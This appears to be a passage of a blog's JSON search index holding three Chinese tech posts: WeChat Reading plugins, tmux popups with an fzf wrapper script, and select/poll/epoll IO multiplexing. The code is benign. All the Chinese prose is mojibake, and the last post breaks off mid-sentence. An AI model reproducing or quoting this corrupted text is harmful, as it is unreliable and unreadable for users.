[{"title":"å¾®ä¿¡è¯»ä¹¦PCæ’ä»¶","url":"%2Fp%2F6776959d.html","content":"\nå¤šçœ‹é˜…è¯»ï¼šç›®å‰è§‚çœ‹ä½“éªŒï¼Œæ’ç‰ˆè¿˜æ˜¯iOSæœ€å¥½çš„ï¼Œå¥ˆä½•åŒæ­¥å¯¼å‡ºåŠŸèƒ½è¶Šæ¥è¶Šå¼±ï¼Œå±äºä¸å†ç»´æŠ¤çŠ¶æ€ã€‚\n\nneatreaderï¼šå¤šç«¯è¿›åº¦å¯ä»¥å®æ—¶åŒæ­¥ï¼Œéœ€è¦èŠ±é’±ã€‚\n\nå¾®ä¿¡è¯»ä¹¦ï¼šä¸Šä¼ è‡ªå·±çš„ä¹¦å¤šç«¯è¿›åº¦å¯ä»¥å®æ—¶åŒæ­¥ï¼Œå…è´¹ã€‚\n\n> æ”¾å¼ƒå¤šçœ‹é˜…è¯»ï¼Œneatreaderï¼Œæºæ¡¶è½¬ç§»åˆ°å¾®ä¿¡è¯»ä¹¦ã€‚\n\n<!-- more -->\n\n### 1.1 Chrome æ’ä»¶\n\n- å¾®ä¿¡è¯»ä¹¦åŠ©æ‰‹ï¼š<https://github.com/ellipse42/weread_helper_extension>ï¼ˆä¸»é¢˜&å®½åº¦&ç»„é˜Ÿï¼‰\n- å¾®ä¿¡è¯»ä¹¦åšç¬”è®°ï¼š<https://github.com/Higurashi-kagome/wereader>ï¼ˆä¸»é¢˜&å¯¼å‡ºå¢å¼ºï¼‰\n\n### 1.2 æ²¹çŒ´æ’ä»¶\n\n- å¾®ä¿¡è¯»ä¹¦é˜…è¯»åŠ©æ‰‹ https://greasyfork.org/zh-CN/scripts/420774\n\t- ä¸‹æ»‘ä¼˜é›…éšè—é¡¶æ å’Œä¾§è¾¹æ \n\t- ç®€åŒ–å¤æ‚çš„åˆ’çº¿èœå•\n- å¾®ä¿¡è¯»ä¹¦åŠ å®½åº¦ï¼šhttps://greasyfork.org/zh-CN/scripts/418878\n- å¾®ä¿¡è¯»ä¹¦åˆ°htmlï¼šhttps://greasyfork.org/zh-CN/scripts/450169\n- æœ€å¥½çš„é˜…è¯»æ¨¡å¼ï¼šhttps://greasyfork.org/zh-CN/scripts/463671 [ä¸€ä¸ªå¤Ÿç”¨]\n- ç»¼åˆå¯è‡ªåŠ¨ï¼šhttps://greasyfork.org/zh-CN/scripts/440339 [ä¸€ä¸ªå¤Ÿç”¨]\n\n### 1.3 Obsidian å¯¼å‡ºæ’ä»¶\n\nhttps://github.com/zhaohongxuan/obsidian-weread-plugin [å¿…å¤‡]\n\n```ini\n---\ntitle: ã€Š{{metaData.title}}ã€‹\ndate: {{metaData.lastReadDate}}\n---\n\n{% for chapter in chapterHighlights %}\n## {{chapter.chapterTitle}}\n{% for highlight in chapter.highlights %}\n{% if highlight.reviewContent %}{% else %}\n- ğŸ“Œ {{ highlight.markText |trim }} \n    - â± {{highlight.createTime}}{% endif %} {% endfor %}{% endfor %}\n\n# è¯»ä¹¦ç¬”è®°\n{% for chapter in bookReview.chapterReviews %}{% if chapter.reviews or chapter.chapterReview %}\n## {{chapter.chapterTitle}}\n{% if  chapter.chapterReviews %}{% for chapterReview in chapter.chapterReviews %}\n### ç« èŠ‚è¯„è®º No.{{loop.index}}\n- {{chapterReview.content}} ^{{chapterReview.reviewId}}\n    - â± {{chapterReview.createTime}} {% endfor%}{%endif %}{% if chapter.reviews %}{%for review in chapter.reviews %}\n### åˆ’çº¿è¯„è®º\n- ğŸ“Œ {{review.abstract |trim }}  ^{{review.reviewId}}\n    - ğŸ’­ {{review.content}}\n    - â± {{review.createTime}}\n{% endfor %} {%endif %} {% endif %} {% endfor %}\n\n# æœ¬ä¹¦è¯„è®º\n{% if bookReview.bookReviews %}{% for bookReview in bookReview.bookReviews %}\n## ä¹¦è¯„ No.{{loop.index}} \n{{bookReview.mdContent}} ^{{bookReview.reviewId}}\nâ± {{bookReview.createTime}}\n{% endfor%}{% endif %}\n```\n","categories":["è¯»ä¹¦"]},{"title":"tmuxçš„å¼¹çª—åŠŸèƒ½å’Œfzfæœç´¢","url":"%2Fp%2F1104a363.html","content":"\n# 1. ä»‹ç»\n\ntmux å·²ç»æ”¯æŒ popupåŠŸèƒ½, ä½†æ˜¯æš‚æ—¶è¿˜æ²¡æœ‰å‘å¸ƒåˆ° stable release ç‰ˆæœ¬, æ‰€ä»¥éœ€è¦ä½¿ç”¨çš„éœ€è¦åœ¨å¼€å‘åˆ†æ”¯ä¸Šç¼–è¯‘ä½¿ç”¨, å³tmux ç‰ˆæœ¬éœ€è¦>=3.2\n\n![image-20210311105854535](tmux%E7%9A%84%E5%BC%B9%E7%AA%97%E5%8A%9F%E8%83%BD%E5%92%8Cfzf%E6%90%9C%E7%B4%A2/image-20210311105854535.png)\n\n<!-- more -->\n\n# 2. ä½¿ç”¨\n\n### 2.1 å‡çº§ tmux \n\nç¡®è®¤ä¸‹ tmux ç‰ˆæœ¬, å¦‚æœå°äº3.2å°±å¼€å§‹å‡çº§.\n\n```bash\ntmux -V\n```\n\nhttps://github.com/tmux/tmux/releases ä¸‹è½½æœ€æ–°çš„ release, ç¼–è¯‘å®‰è£…\n\n```bash\n./configure && make\nsudo make install\n```\n\næ³¨æ„: å‡çº§åå¦‚æœå¼€å¯äº†`tmux-resurrect`,  sessionä¼šç›´æ¥å¡æ­»\n\néœ€è¦æŠŠsession æ€å®Œå, å¹¶ `tmux kill-server `, å†è¿›ä¸€æ¬¡ (å·¨å‘!!!)\n\n### 2.2 tmux å†…ä½¿ç”¨\n\nå¼¹å‡ºä¸€ä¸ª80%å®½é«˜çš„å¼¹çª—\n\n```bash\ntmux popup -w 80% -h 80%\n```\n\nåˆ›å»ºä¸¤ä¸ªåˆ«å:\n\n\n```bash\nalias p='tmux popup -w 80% -h 80%' \nalias pp='tmux popup -w 90% -h 90%  \"tmux attach -t popup || tmux new -s popup\"'\n```\n\n\n\n# 3. fzf-tmux ï¼ˆå¼¹çª—ä½¿ç”¨fzfï¼‰\n\nåœ¨tmuxé‡Œé€šè¿‡å¼¹çª—å½¢å¼ä½¿ç”¨ fzf,  å‚è€ƒ: https://github.com/kevinhwang91/fzf-tmux-script/\n\n![image-20210311104129324](tmux%E7%9A%84%E5%BC%B9%E7%AA%97%E5%8A%9F%E8%83%BD%E5%92%8Cfzf%E6%90%9C%E7%B4%A2/image-20210311104129324.png)\n\n### 3.1 å®‰è£…\n\nä¸‹é¢æ˜¯fzfpè„šæœ¬,  ç»™ä¸ªæ‰§è¡Œæƒé™, æ‰”åˆ°ç¯å¢ƒå˜é‡ä¸‹, å¦‚ `~/.fzf/bin/`\n\n```shell\n#!/usr/bin/env bash\n\nfail() {\n    echo \"$1\" >&2\n    exit 2\n}\n\nfzf=$(command -v fzf 2>/dev/null) || fzf=$(dirname $0)/fzf\n[[ -x \"$fzf\" ]] || fail 'fzf executable not found'\n\nif [[ -n $TMUX_POPUP_NESTED_FB ]]; then\n    eval \"$TMUX_POPUP_NESTED_FB\" && exec fzf \"$@\"\nfi\n\ntmux -V | awk '{match($0, /[0-9]+\\.[0-9]+/, m);exit m[0]<3.2}' || exec fzf \"$@\"\n\nargs=('--no-height')\nwhile (($#)); do\n    arg=$1\n    case $arg in\n    --height | --width)\n        eval \"${arg:2}=$2\"\n        shift\n        ;;\n    --height=* | --width=*)\n        eval \"${arg:2}\"\n        ;;\n    *)\n        args+=(\"$arg\")\n        ;;\n    esac\n    shift\ndone\n\nopts=$(printf '%q ' \"${args[@]}\")\n\n[[ -z $height ]] && height=${TMUX_POPUP_HEIGHT:-80%}\n[[ -z $width ]] && width=${TMUX_POPUP_WIDTH:-80%}\n\nenvs=\"SHELL=$SHELL\"\n[[ -n $FZF_DEFAULT_OPTS ]] && envs=\"$envs FZF_DEFAULT_OPTS=$(printf %q \"$FZF_DEFAULT_OPTS\")\"\n[[ -n $FZF_DEFAULT_COMMAND ]] && envs=\"$envs FZF_DEFAULT_COMMAND=$(printf %q \"$FZF_DEFAULT_COMMAND\")\"\n\nid=$RANDOM\ncmd_file=\"${TMPDIR:-/tmp}/fzf-cmd-file-$id\"\npstdin=\"${TMPDIR:-/tmp}/fzf-pstdin-$id\"\npstdout=\"${TMPDIR:-/tmp}/fzf-pstdout-$id\"\n\nclean_cmd=\"command rm -f $cmd_file $pstdin $pstdout\"\n\ncleanup() {\n    eval \"$clean_cmd\"\n}\ntrap 'cleanup' EXIT\n\nmkfifo \"$pstdout\"\n\necho -n \"trap '$clean_cmd' EXIT SIGINT SIGTERM SIGHUP;\" >\"$cmd_file\"\n\nif [[ -t 0 ]]; then\n    echo -n \"$fzf $opts > $pstdout\" >>\"$cmd_file\"\nelse\n    mkfifo \"$pstdin\"\n    echo -n \"$fzf $opts < $pstdin > $pstdout\" >>\"$cmd_file\"\n    cat <&0 >\"$pstdin\" &\nfi\ncat \"$pstdout\" &\ntmux popup -d '#{pane_current_path}' -xC -yC -w$width -h$height -E \"$envs bash $cmd_file\"\n```\n\nå¹¶ä¸”åœ¨ zshrc ä¸‹ å¢åŠ å¯åŠ¨è„šæœ¬:\n\n```shell\nif [[ -n $TMUX_PANE ]] && (( $+commands[tmux] )) && (( $+commands[fzfp] )); then\n    # fallback to normal fzf if current session name is `floating`\n    export TMUX_POPUP_NESTED_FB='test $(tmux display -pF \"#{==:#S,floating}\") == 1'\n\n    export TMUX_POPUP_WIDTH=80%\nfi\n```\n\nç®€å•åˆ›å»ºä¸€ä¸ªåˆ«å:\n\n```bash\nalias f=\"fzfp --preview 'cat {}'\"\n```\n\n![image-20210311105110624](tmux%E7%9A%84%E5%BC%B9%E7%AA%97%E5%8A%9F%E8%83%BD%E5%92%8Cfzf%E6%90%9C%E7%B4%A2/image-20210311105110624.png)\n\n#  4. tmux-fzf (ç®¡ç†tmux)\n\né€šè¿‡ fzf ç®¡ç† tmux å·¥ä½œç¯å¢ƒ, ä¹Ÿå¯ä»¥é€šè¿‡å¼¹çª—å½¢å¼.  å‚è€ƒ:  https://github.com/sainnhe/tmux-fzf\n\n### 4.1 å®‰è£…\n\n+ Add this line to your `~/.tmux.conf`\n\n  ```bash\n  set -g @plugin 'sainnhe/tmux-fzf'\n  ```\n\n+ Reload configuration, then press prefix + I.\n\n+ To launch tmux-fzf, press prefix + F (Shift+F).\n\n![image-20210311105721312](tmux%E7%9A%84%E5%BC%B9%E7%AA%97%E5%8A%9F%E8%83%BD%E5%92%8Cfzf%E6%90%9C%E7%B4%A2/image-20210311105721312.png)\n\n\n\n# 5. å‚è€ƒèµ„æ–™\n\n+ https://github.com/tmux/tmux/issues/1842\n+ https://blog.meain.io/2020/tmux-flating-scratch-terminal/\n+ https://github.com/kevinhwang91/fzf-tmux-script\n+ https://github.com/sainnhe/tmux-fzf\n\n","tags":["tmux"],"categories":["tmux"]},{"title":"ioå¤šè·¯å¤ç”¨select_poll_epoll","url":"%2Fp%2F457c2d1f.html","content":"\n# 1. åŸºç¡€æ¦‚å¿µ\n\n### 1.1 å†…æ ¸æ€å’Œç”¨æˆ·æ€\n\nLinuxç³»ç»Ÿä¸­åˆ†ä¸ºå†…æ ¸æ€(Kernel model)å’Œç”¨æˆ·æ€(User model)ï¼ŒCPUä¼šåœ¨ä¸¤ä¸ªmodelä¹‹é—´åˆ‡æ¢ã€‚\n\n+ å†…æ ¸æ€ä»£ç æ‹¥æœ‰å®Œå…¨çš„åº•å±‚èµ„æºæ§åˆ¶æƒé™ï¼Œå¯ä»¥æ‰§è¡Œä»»ä½•CPUæŒ‡ä»¤ï¼Œè®¿é—®ä»»ä½•å†…å­˜åœ°å€ï¼Œå…¶å æœ‰çš„å¤„ç†æœºæ˜¯ä¸å…è®¸è¢«æŠ¢å çš„ã€‚å†…æ ¸æ€çš„æŒ‡ä»¤åŒ…æ‹¬ï¼šå¯åŠ¨I/Oï¼Œå†…å­˜æ¸…é›¶ï¼Œä¿®æ”¹ç¨‹åºçŠ¶æ€å­—ï¼Œè®¾ç½®æ—¶é’Ÿï¼Œå…è®¸/ç»ˆæ­¢ä¸­æ–­å’Œåœæœºã€‚å†…æ ¸æ€çš„ç¨‹åºå´©æºƒä¼šå¯¼è‡´PCåœæœºã€‚\n\n+ ç”¨æˆ·æ€æ˜¯ç”¨æˆ·ç¨‹åºèƒ½å¤Ÿä½¿ç”¨çš„æŒ‡ä»¤ï¼Œä¸èƒ½ç›´æ¥è®¿é—®åº•å±‚ç¡¬ä»¶å’Œå†…å­˜åœ°å€ã€‚ç”¨æˆ·æ€è¿è¡Œçš„ç¨‹åºå¿…é¡»å§”æ‰˜ç³»ç»Ÿè°ƒç”¨æ¥è®¿é—®ç¡¬ä»¶å’Œå†…å­˜ã€‚ç”¨æˆ·æ€çš„æŒ‡ä»¤åŒ…æ‹¬ï¼šæ§åˆ¶è½¬ç§»ï¼Œç®—æ•°è¿ç®—ï¼Œå–æ•°æŒ‡ä»¤ï¼Œè®¿ç®¡æŒ‡ä»¤ï¼ˆä½¿ç”¨æˆ·ç¨‹åºä»ç”¨æˆ·æ€é™·å…¥å†…æ ¸æ€ï¼‰ã€‚\n\n<!-- more -->\n\n### 1.2 ç”¨æˆ·æ€å’Œå†…æ ¸æ€çš„åˆ‡æ¢\n\nç”¨æˆ·æ€åˆ‡æ¢åˆ°å†…æ ¸æ€æœ‰ä¸‰ç§æ–¹å¼ï¼š \n\n##### 1. ç³»ç»Ÿè°ƒç”¨\n\nè¿™æ˜¯ç”¨æˆ·æ€è¿›ç¨‹ä¸»åŠ¨è¦æ±‚åˆ‡æ¢åˆ°å†…æ ¸æ€çš„ä¸€ç§æ–¹å¼ï¼Œç”¨æˆ·æ€è¿›ç¨‹é€šè¿‡ç³»ç»Ÿè°ƒç”¨ç”³è¯·ä½¿ç”¨æ“ä½œç³»ç»Ÿæä¾›çš„æœåŠ¡ç¨‹åºå®Œæˆå·¥ä½œï¼Œæ¯”å¦‚å‰ä¾‹ä¸­fork()å®é™…ä¸Šå°±æ˜¯æ‰§è¡Œäº†ä¸€ä¸ªåˆ›å»ºæ–°è¿›ç¨‹çš„ç³»ç»Ÿè°ƒç”¨ã€‚è€Œç³»ç»Ÿè°ƒç”¨çš„æœºåˆ¶å…¶æ ¸å¿ƒè¿˜æ˜¯ä½¿ç”¨äº†æ“ä½œç³»ç»Ÿä¸ºç”¨æˆ·ç‰¹åˆ«å¼€æ”¾çš„ä¸€ä¸ªä¸­æ–­æ¥å®ç°ï¼Œä¾‹å¦‚Linuxçš„int 80hä¸­æ–­ã€‚ \n\n##### 2. å¼‚å¸¸\n\nå½“CPUåœ¨æ‰§è¡Œè¿è¡Œåœ¨ç”¨æˆ·æ€ä¸‹çš„ç¨‹åºæ—¶ï¼Œå‘ç”Ÿäº†æŸäº›äº‹å…ˆä¸å¯çŸ¥çš„å¼‚å¸¸ï¼Œè¿™æ—¶ä¼šè§¦å‘ç”±å½“å‰è¿è¡Œè¿›ç¨‹åˆ‡æ¢åˆ°å¤„ç†æ­¤å¼‚å¸¸çš„å†…æ ¸ç›¸å…³ç¨‹åºä¸­ï¼Œä¹Ÿå°±è½¬åˆ°äº†å†…æ ¸æ€ï¼Œæ¯”å¦‚ç¼ºé¡µå¼‚å¸¸ã€‚\n\n##### 3. å¤–å›´è®¾å¤‡çš„ä¸­æ–­\n\nå½“å¤–å›´è®¾å¤‡å®Œæˆç”¨æˆ·è¯·æ±‚çš„æ“ä½œåï¼Œä¼šå‘CPUå‘å‡ºç›¸åº”çš„ä¸­æ–­ä¿¡å·ï¼Œè¿™æ—¶CPUä¼šæš‚åœæ‰§è¡Œä¸‹ä¸€æ¡å³å°†è¦æ‰§è¡Œçš„æŒ‡ä»¤è½¬è€Œå»æ‰§è¡Œä¸ä¸­æ–­ä¿¡å·å¯¹åº”çš„å¤„ç†ç¨‹åºï¼Œå¦‚æœå…ˆå‰æ‰§è¡Œçš„æŒ‡ä»¤æ˜¯ç”¨æˆ·æ€ä¸‹çš„ç¨‹åºï¼Œé‚£ä¹ˆè¿™ä¸ªè½¬æ¢çš„è¿‡ç¨‹è‡ªç„¶ä¹Ÿå°±å‘ç”Ÿäº†ç”±ç”¨æˆ·æ€åˆ°å†…æ ¸æ€çš„åˆ‡æ¢ã€‚æ¯”å¦‚ç¡¬ç›˜è¯»å†™æ“ä½œå®Œæˆï¼Œç³»ç»Ÿä¼šåˆ‡æ¢åˆ°ç¡¬ç›˜è¯»å†™çš„ä¸­æ–­å¤„ç†ç¨‹åºä¸­æ‰§è¡Œåç»­æ“ä½œç­‰ã€‚\n\n\n\n# 2. å¤šæœåŠ¡æ¨¡å‹\n\n### 2.1  å¤šè¿›ç¨‹æ¨¡å‹\n\næœåŠ¡å™¨çš„ä¸»è¿›ç¨‹è´Ÿè´£ç›‘å¬å®¢æˆ·çš„è¿æ¥ï¼Œä¸€æ—¦ä¸å®¢æˆ·ç«¯è¿æ¥å®Œæˆï¼Œaccept() å‡½æ•°å°±ä¼šè¿”å›ä¸€ä¸ªã€Œå·²è¿æ¥ Socketã€ï¼Œè¿™æ—¶å°±é€šè¿‡ fork() å‡½æ•°åˆ›å»ºä¸€ä¸ªå­è¿›ç¨‹ï¼Œå®é™…ä¸Šå°±æŠŠçˆ¶è¿›ç¨‹æ‰€æœ‰ç›¸å…³çš„ä¸œè¥¿éƒ½å¤åˆ¶ä¸€ä»½ï¼ŒåŒ…æ‹¬æ–‡ä»¶æè¿°ç¬¦ã€å†…å­˜åœ°å€ç©ºé—´ã€ç¨‹åºè®¡æ•°å™¨ã€æ‰§è¡Œçš„ä»£ç ç­‰ã€‚\n\nè¿™ä¸¤ä¸ªè¿›ç¨‹åˆšå¤åˆ¶å®Œçš„æ—¶å€™ï¼Œå‡ ä¹ä¸€æ¨¡ä¸€æ ·ã€‚ä¸è¿‡ï¼Œä¼šæ ¹æ®è¿”å›å€¼æ¥åŒºåˆ†æ˜¯çˆ¶è¿›ç¨‹è¿˜æ˜¯å­è¿›ç¨‹ï¼Œå¦‚æœè¿”å›å€¼æ˜¯ 0ï¼Œåˆ™æ˜¯å­è¿›ç¨‹ï¼›å¦‚æœè¿”å›å€¼æ˜¯å…¶ä»–çš„æ•´æ•°ï¼Œå°±æ˜¯çˆ¶è¿›ç¨‹ã€‚\n\næ­£å› ä¸ºå­è¿›ç¨‹ä¼šå¤åˆ¶çˆ¶è¿›ç¨‹çš„æ–‡ä»¶æè¿°ç¬¦ï¼Œäºæ˜¯å°±å¯ä»¥ç›´æ¥ä½¿ç”¨ã€Œå·²è¿æ¥ Socket ã€å’Œå®¢æˆ·ç«¯é€šä¿¡äº†ï¼Œ\n\n<img src=\"ioå¤šè·¯å¤ç”¨select_poll_epoll/å¤šè¿›ç¨‹.png\" alt=\"img\" style=\"zoom:50%;\" />\n\nå¯ä»¥å‘ç°ï¼Œå­è¿›ç¨‹ä¸éœ€è¦å…³å¿ƒã€Œç›‘å¬ Socketã€ï¼Œåªéœ€è¦å…³å¿ƒã€Œå·²è¿æ¥ Socketã€ï¼›çˆ¶è¿›ç¨‹åˆ™ç›¸åï¼Œå°†å®¢æˆ·æœåŠ¡äº¤ç»™å­è¿›ç¨‹æ¥å¤„ç†ï¼Œå› æ­¤çˆ¶è¿›ç¨‹ä¸éœ€è¦å…³å¿ƒã€Œå·²è¿æ¥ Socketã€ï¼Œåªéœ€è¦å…³å¿ƒã€Œç›‘å¬ Socketã€ã€‚\n\n### 2.2 å¤šçº¿ç¨‹æ¨¡å‹\n\nå½“æœåŠ¡å™¨ä¸å®¢æˆ·ç«¯ TCP å®Œæˆè¿æ¥åï¼Œé€šè¿‡ pthread_create() å‡½æ•°åˆ›å»ºçº¿ç¨‹ï¼Œç„¶åå°†ã€Œå·²è¿æ¥ Socketã€çš„æ–‡ä»¶æè¿°ç¬¦ä¼ é€’ç»™çº¿ç¨‹å‡½æ•°ï¼Œæ¥ç€åœ¨çº¿ç¨‹é‡Œå’Œå®¢æˆ·ç«¯è¿›è¡Œé€šä¿¡ï¼Œä»è€Œè¾¾åˆ°å¹¶å‘å¤„ç†çš„ç›®çš„ã€‚\n\nå¦‚æœæ¯æ¥ä¸€ä¸ªè¿æ¥å°±åˆ›å»ºä¸€ä¸ªçº¿ç¨‹ï¼Œçº¿ç¨‹è¿è¡Œå®Œåï¼Œè¿˜å¾—æ“ä½œç³»ç»Ÿè¿˜å¾—é”€æ¯çº¿ç¨‹ï¼Œè™½è¯´çº¿ç¨‹åˆ‡æ¢çš„ä¸Šå†™æ–‡å¼€é”€ä¸å¤§ï¼Œä½†æ˜¯å¦‚æœé¢‘ç¹åˆ›å»ºå’Œé”€æ¯çº¿ç¨‹ï¼Œç³»ç»Ÿå¼€é”€ä¹Ÿæ˜¯ä¸å°çš„ã€‚\n\né‚£ä¹ˆï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨çº¿ç¨‹æ± çš„æ–¹å¼æ¥é¿å…çº¿ç¨‹çš„é¢‘ç¹åˆ›å»ºå’Œé”€æ¯ï¼Œæ‰€è°“çš„çº¿ç¨‹æ± ï¼Œå°±æ˜¯æå‰åˆ›å»ºè‹¥å¹²ä¸ªçº¿ç¨‹ï¼Œè¿™æ ·å½“ç”±æ–°è¿æ¥å»ºç«‹æ—¶ï¼Œå°†è¿™ä¸ªå·²è¿æ¥çš„ Socket æ”¾å…¥åˆ°ä¸€ä¸ªé˜Ÿåˆ—é‡Œï¼Œç„¶åçº¿ç¨‹æ± é‡Œçš„çº¿ç¨‹è´Ÿè´£ä»é˜Ÿåˆ—ä¸­å–å‡ºã€Œå·²è¿æ¥ Socket ã€è¿›è¡Œå¤„ç†ã€‚\n\n<img src=\"ioå¤šè·¯å¤ç”¨select_poll_epoll/çº¿ç¨‹æ± .png\" alt=\"img\" style=\"zoom:50%;\" />\n\nä¸Šé¢åŸºäºè¿›ç¨‹æˆ–è€…çº¿ç¨‹æ¨¡å‹çš„ï¼Œå…¶å®è¿˜æ˜¯æœ‰é—®é¢˜çš„ã€‚æ–°åˆ°æ¥ä¸€ä¸ª TCP è¿æ¥ï¼Œå°±éœ€è¦åˆ†é…ä¸€ä¸ªè¿›ç¨‹æˆ–è€…çº¿ç¨‹ï¼Œé‚£ä¹ˆå¦‚æœè¦è¾¾åˆ° C10Kï¼ˆåŒæ—¶å¤„ç† 10000 ä¸ªå¹¶å‘è¿æ¥çš„èƒ½åŠ›ï¼‰ï¼Œæ„å‘³ç€è¦ä¸€å°æœºå™¨ç»´æŠ¤ 1 ä¸‡ä¸ªè¿æ¥ï¼Œç›¸å½“äºè¦ç»´æŠ¤ 1 ä¸‡ä¸ªè¿›ç¨‹/çº¿ç¨‹ï¼Œæ“ä½œç³»ç»Ÿå°±ç®—æ­»æ‰›ä¹Ÿæ˜¯æ‰›ä¸ä½çš„ã€‚\n\n\n\n# 2. IOå¤šè·¯å¤ç”¨\n\nä¸ºæ¯ä¸ªå®¢æˆ·ç«¯åˆ›å»ºä¸€ä¸ªçº¿ç¨‹ï¼ŒæœåŠ¡å™¨ç«¯çš„çº¿ç¨‹èµ„æºå¾ˆå®¹æ˜“è¢«è€—å…‰ã€‚å½“ç„¶è¿˜æœ‰ä¸ªèªæ˜çš„åŠæ³•ï¼Œæˆ‘ä»¬å¯ä»¥æ¯ accept ä¸€ä¸ªå®¢æˆ·ç«¯è¿æ¥åï¼Œå°†è¿™ä¸ªæ–‡ä»¶æè¿°ç¬¦ï¼ˆconnfdï¼‰æ”¾åˆ°ä¸€ä¸ªæ•°ç»„é‡Œã€‚ç„¶åå¼„ä¸€ä¸ªæ–°çš„çº¿ç¨‹å»ä¸æ–­éå†è¿™ä¸ªæ•°ç»„ï¼Œè°ƒç”¨æ¯ä¸€ä¸ªå…ƒç´ çš„éé˜»å¡ read æ–¹æ³•ã€‚\n\n```c\naccept  ->  fdlist.add(connfd);\n\n\nwhile(1) {\n  for(fd <-- fdlist) {\n    if(read(fd) != -1) {\n      doSomeThing();\n    }\n  }\n}\n```\n\n\n\nä½†è¿™å’Œæˆ‘ä»¬ç”¨å¤šçº¿ç¨‹å»å°†é˜»å¡ IO æ”¹é€ æˆçœ‹èµ·æ¥æ˜¯éé˜»å¡ IO ä¸€æ ·ï¼Œè¿™ç§éå†æ–¹å¼ä¹Ÿåªæ˜¯æˆ‘ä»¬ç”¨æˆ·è‡ªå·±æƒ³å‡ºçš„å°æŠŠæˆï¼Œæ¯æ¬¡éå†é‡åˆ° read è¿”å› -1 æ—¶ä»ç„¶æ˜¯ä¸€æ¬¡æµªè´¹èµ„æºçš„ç³»ç»Ÿè°ƒç”¨ã€‚åœ¨ while å¾ªç¯é‡Œåšç³»ç»Ÿè°ƒç”¨ï¼Œå°±å¥½æ¯”ä½ åšåˆ†å¸ƒå¼é¡¹ç›®æ—¶åœ¨ while é‡Œåš rpc è¯·æ±‚ä¸€æ ·ï¼Œæ˜¯ä¸åˆ’ç®—çš„ã€‚\n\næ‰€ä»¥ï¼Œè¿˜æ˜¯å¾—æ³è¯·æ“ä½œç³»ç»Ÿè€å¤§ï¼Œæä¾›ç»™æˆ‘ä»¬ä¸€ä¸ªæœ‰è¿™æ ·æ•ˆæœçš„å‡½æ•°ï¼Œæˆ‘ä»¬å°†ä¸€æ‰¹æ–‡ä»¶æè¿°ç¬¦é€šè¿‡ä¸€æ¬¡ç³»ç»Ÿè°ƒç”¨ä¼ ç»™å†…æ ¸ï¼Œç”±å†…æ ¸å±‚å»éå†ï¼Œæ‰èƒ½çœŸæ­£è§£å†³è¿™ä¸ªé—®é¢˜ã€‚\n\n\n\n### 2.1 select \n\nselect å®ç°å¤šè·¯å¤ç”¨çš„æ–¹å¼æ˜¯ï¼Œå°†å·²è¿æ¥çš„ Socket éƒ½æ”¾åˆ°ä¸€ä¸ªæ–‡ä»¶æè¿°ç¬¦é›†åˆï¼Œç„¶åè°ƒç”¨ select å‡½æ•°å°†æ–‡ä»¶æè¿°ç¬¦é›†åˆæ‹·è´åˆ°å†…æ ¸é‡Œï¼Œè®©å†…æ ¸æ¥æ£€æŸ¥æ˜¯å¦æœ‰ç½‘ç»œäº‹ä»¶äº§ç”Ÿï¼Œæ£€æŸ¥çš„æ–¹å¼å¾ˆç²—æš´ï¼Œå°±æ˜¯é€šè¿‡éå†æ–‡ä»¶æè¿°ç¬¦é›†åˆçš„æ–¹å¼ï¼Œå½“æ£€æŸ¥åˆ°æœ‰äº‹ä»¶äº§ç”Ÿåï¼Œå°†æ­¤ Socket æ ‡è®°ä¸ºå¯è¯»æˆ–å¯å†™ï¼Œ æ¥ç€å†æŠŠæ•´ä¸ªæ–‡ä»¶æè¿°ç¬¦é›†åˆæ‹·è´å›ç”¨æˆ·æ€é‡Œï¼Œç„¶åç”¨æˆ·æ€è¿˜éœ€è¦å†é€šè¿‡éå†çš„æ–¹æ³•æ‰¾åˆ°å¯è¯»æˆ–å¯å†™çš„ Socketï¼Œç„¶åå†å¯¹å…¶å¤„ç†ã€‚\n\næ‰€ä»¥ï¼Œå¯¹äº select è¿™ç§æ–¹å¼ï¼Œéœ€è¦è¿›è¡Œ 2 æ¬¡ã€Œéå†ã€æ–‡ä»¶æè¿°ç¬¦é›†åˆï¼Œä¸€æ¬¡æ˜¯åœ¨å†…æ ¸æ€é‡Œï¼Œä¸€ä¸ªæ¬¡æ˜¯åœ¨ç”¨æˆ·æ€é‡Œ ï¼Œè€Œä¸”è¿˜ä¼šå‘ç”Ÿ 2 æ¬¡ã€Œæ‹·è´ã€æ–‡ä»¶æè¿°ç¬¦é›†åˆï¼Œå…ˆä»ç”¨æˆ·ç©ºé—´ä¼ å…¥å†…æ ¸ç©ºé—´ï¼Œç”±å†…æ ¸ä¿®æ”¹åï¼Œå†ä¼ å‡ºåˆ°ç”¨æˆ·ç©ºé—´ä¸­ã€‚\n\n\n\n```c\nint select(\n    int nfds,  // nfds:ç›‘æ§çš„æ–‡ä»¶æè¿°ç¬¦é›†é‡Œæœ€å¤§æ–‡ä»¶æè¿°ç¬¦åŠ 1\n    fd_set *readfds, // readfdsï¼šç›‘æ§æœ‰è¯»æ•°æ®åˆ°è¾¾æ–‡ä»¶æè¿°ç¬¦é›†åˆï¼Œä¼ å…¥ä¼ å‡ºå‚æ•°\n    fd_set *writefds, // writefdsï¼šç›‘æ§å†™æ•°æ®åˆ°è¾¾æ–‡ä»¶æè¿°ç¬¦é›†åˆï¼Œä¼ å…¥ä¼ å‡ºå‚æ•°\n    fd_set *exceptfds, // exceptfdsï¼šç›‘æ§å¼‚å¸¸å‘ç”Ÿè¾¾æ–‡ä»¶æè¿°ç¬¦é›†åˆ, ä¼ å…¥ä¼ å‡ºå‚æ•°\n    struct timeval *timeout); // timeoutï¼šå®šæ—¶é˜»å¡ç›‘æ§æ—¶é—´ï¼Œ3ç§æƒ…å†µ  1.NULLï¼Œæ°¸è¿œç­‰ä¸‹å» 2.è®¾ç½®timevalï¼Œç­‰å¾…å›ºå®šæ—¶é—´ 3.è®¾ç½®timevalé‡Œæ—¶é—´å‡ä¸º0ï¼Œæ£€æŸ¥æè¿°å­—åç«‹å³è¿”å›ï¼Œè½®è¯¢\n```\n\n\n\nselect å‡½æ•°ç›‘è§†çš„æ–‡ä»¶æè¿°ç¬¦åˆ†3ç±»ï¼Œåˆ†åˆ«æ˜¯writefdsã€readfdsã€å’Œexceptfdsã€‚è°ƒç”¨åselectå‡½æ•°ä¼šé˜»å¡ï¼Œç›´åˆ°æœ‰æè¿°å‰¯å°±ç»ªï¼ˆæœ‰æ•°æ® 